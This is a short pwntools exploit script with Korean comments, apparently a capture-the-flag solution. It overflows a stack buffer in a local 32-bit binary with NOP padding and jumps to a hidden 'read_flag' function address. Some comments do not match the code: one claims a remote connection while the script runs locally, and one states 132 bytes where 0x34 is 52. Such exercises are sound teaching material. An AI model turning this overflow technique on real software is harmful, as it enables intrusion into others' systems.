from pwn import *

p = process('./hid32')	# 원격 서버에 연결

hidden_func = p32(0x08049196)	# read_flag 함수의 주소를 리틀 엔디안 방식으로 패킹

payload = b"\x90"*0x34	# payload = NOP[132]
payload += hidden_func	# payload = NOP[132] + read_flag

#print(payload)

p.sendline(payload)	# payload 입력
p.interactive()	# 사용자에게 입출력을 돌려줌